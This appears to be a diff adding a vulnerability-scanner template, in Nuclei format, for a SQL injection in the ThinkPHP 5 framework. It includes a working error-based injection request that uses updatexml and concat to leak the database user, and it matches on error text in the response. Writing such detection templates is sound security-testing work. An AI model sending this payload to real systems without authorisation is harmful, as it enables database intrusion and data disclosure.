@@ -1,0 +1,25 @@
+id: thinkphp5_sqli
+
+info:
+  name: "ThinkPHP 5 框架数据库查询构造 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    A critical SQL injection vulnerability exists in ThinkPHP 5 due to improper sanitization of user-supplied input during database query construction. This allows attackers to inject arbitrary SQL commands through manipulated request parameters, potentially leading to unauthorized data disclosure, modification, or deletion. The vulnerability was disclosed on 2023-12-04 and requires immediate patching of affected systems.
+  tags: ThinkPHP
+
+http:
+- raw:
+  - |
+    GET /index.php?ids%5B0,updatexml(0,concat(0xa,user()),0)%5D=1 HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'syntax'
+  - type: word
+    part: body
+    words:
+    - 'error'
